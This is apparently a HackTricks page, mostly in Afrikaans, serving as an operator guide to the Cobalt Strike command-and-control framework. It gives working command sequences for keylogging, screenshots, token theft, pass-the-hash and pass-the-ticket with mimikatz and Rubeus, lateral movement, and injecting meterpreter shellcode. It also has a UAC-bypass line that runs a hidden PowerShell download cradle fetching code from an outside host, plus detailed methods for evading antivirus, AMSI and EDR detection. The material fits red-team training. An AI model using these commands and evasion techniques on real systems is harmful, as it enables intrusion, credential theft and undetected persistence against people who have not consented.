# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` dan kan jy kies waar om te luister, watter soort beacon om te gebruik (http, dns, smb...) en meer.

### Peer2Peer Listeners

Die beacons van hierdie listeners hoef nie direk met die C2 te kommunikeer nie; hulle kan deur ander beacons daarmee kommunikeer.

`Cobalt Strike -> Listeners -> Add/Edit` dan moet jy die TCP- of SMB-beacons kies

* Die **TCP beacon sal ’n listener op die gekose poort instel**. Om aan ’n TCP beacon te koppel, gebruik die opdrag `connect <ip> <port>` vanaf ’n ander beacon
* Die **smb beacon sal op ’n pipename met die gekose naam luister**. Om aan ’n SMB beacon te koppel, moet jy die opdrag `link [target] [pipe]` gebruik.

### Genereer en huisves payloads

#### Genereer payloads in lêers

`Attacks -> Packages ->`

* **`HTMLApplication`** vir HTA-lêers
* **`MS Office Macro`** vir ’n kantoordokument met ’n makro
* **`Windows Executable`** vir ’n .exe, .dll of diens-.exe
* **`Windows Executable (S)`** vir ’n **stageless** .exe, .dll of diens-.exe (stageless is beter as staged; minder IoCs)

#### Genereer en huisves payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Dit genereer ’n script/uitvoerbare lêer om die beacon van Cobalt Strike af te laai in formate soos: bitsadmin, exe, powershell en python

#### Huisves payloads

As jy reeds die lêer het wat jy op ’n webbediener wil huisves, gaan bloot na `Attacks -> Web Drive-by -> Host File` en kies die lêer om te huisves en die webbedienerkonfigurasie.

### Beacon Options

<details>
<summary>Beacon-opsies en -opdragte</summary>

```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```

</details>

### Pasgemaakte implants / Linux Beacons

- ’n Pasgemaakte agent hoef net die Cobalt Strike Team Server HTTP/S-protokol (verstek malleable C2-profiel) te gebruik om te registreer/aan te meld en take te ontvang. Implementeer dieselfde URI’s/headers/metadata-enkripsie wat in die profiel gedefinieer is om die Cobalt Strike UI vir taaktoewysing en uitvoer te hergebruik.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- ’n Aggressor Script (bv. `CustomBeacon.cna`) kan payload-generering vir die nie-Windows-beacon omhul sodat operateurs die listener kan kies en ELF-payloads direk vanaf die GUI kan skep.
- Voorbeelde van Linux-taakhanteraars wat aan die Team Server beskikbaar gestel word: `sleep`, `cd`, `pwd`, `shell` (voer arbitrêre opdragte uit), `ls`, `upload`, `download` en `exit`. Dit word gekoppel aan taak-ID’s wat die Team Server verwag, en moet bedienerkant geïmplementeer word om uitvoer in die korrekte formaat terug te gee.
- BOF-ondersteuning op Linux kan bygevoeg word deur Beacon Object Files in-process te laai met [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (ondersteun ook Outflank-styl BOFs), sodat modulêre post-exploitation binne die implant se konteks/voorregte kan loop sonder om nuwe prosesse te skep.<sup>[[2]](#references)[[3]](#references)</sup>
  Sien [Linux BOF loader formats and process boundaries](../linux-hardening/post-exploitation/linux-fileless-execution.md#linux-bof-loader-formats-and-process-boundaries) vir voorbehoude oor Linux-loaderformate en prosesgrense, met ’n aparte voorbeeld van BOF-taaktoewysing.
- Sluit ’n SOCKS-hanteerder in die pasgemaakte beacon in om dieselfde pivoting-vermoë as Windows Beacons te behou: wanneer die operateur `socks <port>` uitvoer, moet die implant ’n plaaslike proxy oopmaak om operateurgereedskap deur die gekompromitteerde Linux-gasheer na interne netwerke te roeteer.

## Opsec

### Execute-Assembly

Die **`execute-assembly`** gebruik ’n **sacrificial process** deur middel van remote process injection om die aangeduide program uit te voer. Dit is baie raserig, aangesien sekere Win API’s gebruik word om binne ’n proses in te spuit, en elke EDR dit nagaan. Daar is egter ’n paar pasgemaakte nutsgoed wat gebruik kan word om iets in dieselfde proses te laai:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- In Cobalt Strike kan jy ook BOF (Beacon Object Files) gebruik: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Die aggressor script `https://github.com/outflanknl/HelpColor` skep die `helpx`-opdrag in Cobalt Strike, wat kleure by opdragte voeg om aan te dui of hulle BOFs (groen), Frok&Run (geel) of iets soortgelyks is, of ProcessExecution, injection of iets soortgelyks (rooi). Dit help om te weet watter opdragte meer stealthy is.

### Moderne post-execution in-process

Onlangse weergawes voeg twee alternatiewe by wanneer ’n klassieke COFF BOF te beperk is:

- **Beacon Interpreter** stel C op die Team Server saam na intermediêre bytecode en voer dit uit in ’n VM wat in Beacon ingebed is. Die bytecode bly data eerder as native uitvoerbare kode, dus vermy dit die ekstra uitvoerbare geheuetoewysing en RW-na-RX-toestemmingsoorgang wat normaalweg nodig is om ’n BOF te laai. Skripte kan die Beacon API invoer en BOF-styl Dynamic Function Resolution (DFR)-prototipes verklaar.
- **BOF-PE** laai ’n volledige EXE of DLL in die huidige Beacon. Hierdie formaat ondersteun gewone PE-imports, uitsonderingshantering, meer gevorderde C++ en eksterne biblioteke, terwyl die Beacon API behoue bly. Dit is swaarder as ’n klein COFF BOF, gebruik dit dus slegs wanneer die bykomende runtime nuttig is.

```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```

Hierdie meganismes verminder seine wat met die loader verband hou, nie die telemetrie wat deur die script se aksies of Windows API-oproepe gegenereer word nie.<sup>[[8]](#references)</sup>

### Tree op as die gebruiker

Jy kan gebeurtenisse soos `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` nagaan:

- Security EID 4624 - Gaan alle interaktiewe aanmeldings na om die gewone werksure te bepaal.
- System EID 12,13 - Gaan die frekwensie van afskakelings/opstarts/slaap na.
- Security EID 4624/4625 - Gaan inkomende geldige/ongeldige NTLM-pogings na.
- Security EID 4648 - Hierdie gebeurtenis word geskep wanneer plaintext-bewyse gebruik word om aan te meld. As 'n proses dit gegenereer het, bevat die binêre lêer moontlik die bewyse as duidelike teks in 'n konfigurasielêer of in die kode.

Wanneer jy `jump` vanuit Cobalt Strike gebruik, is dit beter om die `wmi_msbuild`-metode te gebruik sodat die nuwe proses meer legitiem lyk.

### Gebruik rekenaarrekeninge

Dit is algemeen dat verdedigers nagaan vir vreemde gedrag wat deur gebruikers veroorsaak word, en **diensrekeninge en rekenaarrekeninge soos `*$` van hul monitering uitsluit**. Jy kan hierdie rekeninge gebruik om laterale beweging of privilege escalation uit te voer.

### Gebruik stageless payloads

Stageless payloads is minder opvallend as staged payloads omdat hulle nie 'n tweede stage van die C2-bediener hoef af te laai nie. Dit beteken dat hulle ná die aanvanklike verbinding geen netwerkverkeer genereer nie, wat dit minder waarskynlik maak dat netwerkgebaseerde verdedigingstelsels hulle opspoor.

### Tokens & Token Store

Wees versigtig wanneer jy tokens steel of genereer, want 'n EDR kan thread tokens opnoem en 'n **token opspoor wat aan 'n ander gebruiker behoort** of selfs aan SYSTEM binne die proses.

Hiermee kan jy tokens **per beacon** stoor, sodat jy nie dieselfde token oor en oor hoef te steel nie. Dit is nuttig vir laterale beweging of wanneer jy 'n gesteelde token verskeie kere moet gebruik:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Wanneer jy lateraal beweeg, is dit gewoonlik beter om **'n token te steel as om 'n nuwe een te genereer** of 'n pass the hash-aanval uit te voer.

### Guardrails

Cobalt Strike het 'n funksie genaamd **Guardrails** wat help om die gebruik van sekere opdragte of aksies te voorkom wat deur verdedigers opgespoor kan word. Guardrails kan ingestel word om spesifieke opdragte te blokkeer, soos `make_token`, `jump`, `remote-exec` en ander wat algemeen vir laterale beweging of privilege escalation gebruik word.

Verder bevat die repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) ook 'n paar kontroles en idees wat jy kan oorweeg voordat jy 'n payload uitvoer.

### Kaartjie-enkripsie

Wees in 'n AD versigtig met die enkripsie van kaartjies. Sommige tools gebruik by verstek RC4-enkripsie vir Kerberos-kaartjies, wat minder veilig as AES-enkripsie is; bygewerkte omgewings gebruik by verstek AES. Verdedigers wat swak enkripsie-algoritmes monitor, kan dit opspoor.

### Vermy verstekwaardes

Wanneer jy Cobalt Strike gebruik, sal die SMB-pipes by verstek die name `msagent_####` en `"status_####` hê. Verander daardie name. Jy kan die name van bestaande pipes vanuit Cobalt Strike nagaan met die opdrag: `ls \\.\pipe\`

Verder word 'n pipe genaamd `\\.\pipe\postex_ssh_####` met SSH-sessies geskep. Verander dit met `set ssh_pipename "<new_name>";`.

Ook kan die pipes `\\.\pipe\postex_####` in 'n post-exploitation-aanval verander word met `set pipename "<new_name>"`.

In Cobalt Strike-profiele kan jy ook dinge soos die volgende verander:

- Vermy die gebruik van `rwx`
- Hoe die process injection-gedrag werk (watter APIs gebruik sal word) in die `process-inject {...}`-blok
- Hoe die "fork and run" werk in die `post-ex {…}`-blok
- Die slaaptyd
- Die maksimum grootte van binaries wat in die geheue gelaai word
- Die geheue-voetspoor en DLL-inhoud met die `stage {...}`-blok
- Die netwerkverkeer

### Sleepmask en BeaconGate

'n Sleepmask transformeer Beacon en sy nagespoorde heap-toekennings terwyl dit onaktief is, en herstel dit dan vir taakuitvoering. Huidige weergawes bied 'n ontwykende verstekinstelling, maar pasgemaakte Sleepmask BOFs bly nuttig wanneer die geheue-uitleg, toekenning of oproepstapel ander vereistes het. Sedert weergawe 4.13 vervals die verstek-Sleepmask ook die terugkeeradres vir APIs wat deur BeaconGate geproxy word.<sup>[[8]](#references)</sup>

**BeaconGate** brei hierdie ontwerp verder as `Sleep` uit: geselekteerde WinAPI-oproepe word as `FUNCTION_CALL`-strukture voorgestel en na die Sleepmask BOF gestuur, wat Beacon tydens die uitvoering van die oproep kan masker. Die profiel kan 'n groep (`Comms`, `Core`, `Cleanup` of `All`) of slegs individuele APIs beheer:<sup>[[9]](#references)</sup>

```text
stage {
    set sleep_mask "true";
    set syscall_method "Indirect";

    beacon_gate {
        VirtualAlloc;       # Routed through BeaconGate
        VirtualAllocEx;
        InternetConnectA;
    }
}
```

Vir ’n API wat onder `beacon_gate` gelys is, geniet die gate voorkeur bo `syscall_method`; API’s wat nie gelys is nie, kan steeds die ingestelde syscall-metode gebruik. `beacon_gate disable` en `beacon_gate enable` skakel die funksie tydens looptyd af en aan. Moenie `All` blindelings aktiveer nie: opdragte soos `ps` roep `OpenProcess`/`CloseHandle` herhaaldelik aan en kan ’n CPU-piek veroorsaak wanneer elke aanroep Beacon masker en ontmasker. Sleepmask-VS voorsien nagebootste Beacon/Sleepmask-toestande om pasgemaakte gates te ontfout sonder om dit herhaaldelik deur ’n lewendige implant te toets.<sup>[[9]](#references)</sup>

### Noisy proc injections

Wanneer kode in ’n proses ingespuit word, is dit gewoonlik baie opvallend, omdat **geen gewone proses hierdie handeling gewoonlik uitvoer nie en die maniere om dit te doen baie beperk is**. Daarom kan dit deur gedraggebaseerde opsporingstelsels opgespoor word. Boonop kan dit ook opgespoor word deur EDR’s wat die netwerk skandeer vir **threads wat kode bevat wat nie op skyf is nie** (hoewel dit algemeen voorkom by prosesse soos blaaiers wat JIT gebruik). Voorbeeld: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Wanneer ’n nuwe proses geskep word, is dit belangrik om ’n **gewone ouer-kind-verhouding** tussen prosesse te handhaaf om opsporing te vermy. As svchost.exe iexplorer.exe uitvoer, sal dit verdag lyk, aangesien svchost.exe nie in ’n gewone Windows-omgewing ’n ouer van iexplorer.exe is nie.

Wanneer ’n nuwe beacon by verstek in Cobalt Strike geskep word, word ’n proses met **`rundll32.exe`** geskep om die nuwe listener te laat loop. Dit is nie baie sluipend nie en kan maklik deur EDR’s opgespoor word. Boonop word `rundll32.exe` sonder enige args uitgevoer, wat dit nog verdagter maak.

Met die volgende Cobalt Strike-opdrag kan jy ’n ander proses spesifiseer om die nuwe beacon te skep, sodat dit moeiliker opgespoor kan word:

```bash
spawnto x86 svchost.exe
```

Jy kan ook hierdie instelling **`spawnto_x86` en `spawnto_x64`** in ’n profile verander.

### Proxying van aanvallers se traffic

Aanvallers moet soms tools plaaslik kan laat loop, selfs op Linux-masjiene, en die traffic van slagoffers na die tool laat vloei (bv. NTLM relay).

Boonop is dit soms meer stealthy vir die aanvaller om vir ’n pass-the.hash- of pass-the-ticket-aanval **hierdie hash of ticket plaaslik by sy eie LSASS-proses te voeg** en dan daarvandaan te pivot, eerder as om ’n LSASS-proses op ’n slagoffermasjien te wysig.

Jy moet egter **versigtig wees met die traffic wat gegenereer word**, aangesien jy dalk ongewone traffic (Kerberos?) vanaf jou backdoor-proses stuur. Hiervoor kan jy na ’n browser-proses pivot, hoewel jy betrap kan word terwyl jy in ’n proses injekteer. Dink dus aan ’n stealthy manier om dit te doen.


### AV’s vermy

#### AV/AMSI/ETW Bypass

Gaan na die bladsy:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Gewoonlik kan jy in `/opt/cobaltstrike/artifact-kit` die kode en voorafgecompileerde templates (in `/src-common`) vind van die payloads wat Cobalt Strike gaan gebruik om die binary beacons te genereer.

Deur [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) met die gegenereerde backdoor (of net met die gecompileerde template) te gebruik, kan jy vind wat Defender laat aktiveer. Dit is gewoonlik ’n string. Jy kan dus eenvoudig die kode wysig wat die backdoor genereer, sodat daardie string nie in die finale binary voorkom nie.

Nadat jy die kode gewysig het, voer `./build.sh` uit vanuit dieselfde gids en kopieer die `dist-pipe/`-gids na die Windows-kliënt in `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Moenie vergeet om die aggressive script `dist-pipe\artifact.cna` te laai sodat Cobalt Strike die hulpbronne vanaf die skyf gebruik wat ons wil hê, en nie dié wat reeds gelaai is nie.

#### Resource Kit

Die ResourceKit-lêergids bevat die templates vir Cobalt Strike se scriptgebaseerde payloads, insluitend PowerShell, VBA en HTA.

Deur [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) saam met die templates te gebruik, kan jy vasstel waarvan Defender (AMSI in hierdie geval) nie hou nie, en dit wysig:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Die bespeurde reëls kan gewysig word om ’n sjabloon te genereer wat nie opgespoor sal word nie.

Moenie vergeet om die aggressiewe script `ResourceKit\resources.cna` te laai nie, sodat Cobalt Strike die hulpbronne van die skyf gebruik wat ons wil hê, en nie dié wat reeds gelaai is nie.

#### Function hooks | Syscall

Function hooking is ’n baie algemene metode wat deur EDRs gebruik word om kwaadwillige aktiwiteit op te spoor. Cobalt Strike laat jou toe om hierdie hooks te omseil deur **syscalls** in plaas van die standaard Windows API-oproepe te gebruik met die **`None`**-konfigurasie, of om die `Nt*`-weergawe van ’n funksie met die **`Direct`**-instelling te gebruik, of om bloot oor die `Nt*`-funksie te spring met die **`Indirect`**-opsie in die malleable profile. Afhangend van die stelsel, kan die een opsie stealthier as die ander wees.

Dit kan in die profile gestel word of met die **`syscall-method`**-opdrag.

Dit kan egter ook raserig wees.

Een opsie wat Cobalt Strike bied om function hooks te omseil, is om daardie hooks te verwyder met: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Jy kan ook met [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) of [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector) nagaan watter funksies gehook is.




<details>
<summary>Diverse Cobalt Strike-opdragte</summary>

```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

</details>



## References

- [1] [Cobalt Strike Linux Beacon (pasgemaakte implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF-sjabloon](https://github.com/outflanknl/nix_bof_template)
- [4] [Unit42-ontleding van Cobalt Strike-metadata-enkripsie](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [SANS ISC-dagboek oor Cobalt Strike-verkeer](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13: Verlore in vertaling](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10: Deur die BeaconGate](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
